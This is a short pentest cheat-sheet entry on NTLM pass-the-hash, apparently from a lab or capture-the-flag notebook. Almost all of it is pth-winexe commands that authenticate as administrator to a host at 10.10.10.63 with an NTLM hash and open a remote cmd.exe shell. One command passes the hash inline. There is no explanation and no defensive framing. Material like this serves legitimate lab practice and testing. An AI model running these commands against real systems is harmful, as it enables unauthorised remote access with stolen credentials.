# NTLM \(Pass The Hash\)

```bash
pth-winexe -U administrator //10.10.10.63 cmd.exe
pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe

# When prompted use ntlm hash
# eg. hash = aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
```

![](../.gitbook/assets/image%20%2848%29.png)

